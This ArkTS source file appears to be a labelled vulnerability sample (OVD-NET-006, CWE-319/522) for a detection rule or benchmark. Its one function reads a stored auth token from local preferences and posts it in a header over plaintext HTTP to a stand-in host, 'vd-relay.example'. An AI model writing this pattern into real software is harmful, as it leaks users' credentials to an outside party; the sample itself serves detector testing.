// VULN: OVD-NET-006 明文信道回传本地存储凭据（call-chain：getSync 取 token → request 头外传，CWE-319/522）
// 规则语义：getSync 读取与 request 外传须依序出现；凭据走非加密信道
import { preferences } from '@kit.ArkData';
import { common } from '@kit.AbilityKit';
import { BusinessError } from '@kit.BasicServicesKit';
import { http } from '@kit.NetworkKit';

export function ovdNet006(ctx: common.Context): string {
  // 第一步：从本地 preferences 取持久化凭据
  const p: preferences.Preferences = preferences.getPreferencesSync(ctx, { name: 'app' });
  const token: string = p.getSync('auth_token', '') as string;
  // 第二步：明文 http 信道原样回传（token 进自定义头）
  let err = '';
  try {
    const req: http.HttpRequest = http.createHttp();
    req.request('http://vd-relay.example/ingest', {
      method: http.RequestMethod.POST,
      header: { 'X-Bench-Auth': token },
      extraData: 'sync=1',
      readTimeout: 3000,
      connectTimeout: 3000
    }).catch(() => {});
    req.destroy();
  } catch (e) {
    err = ` (req err=${(e as BusinessError).code})`;
  }
  return `stored token replayed over cleartext${err}`;
}
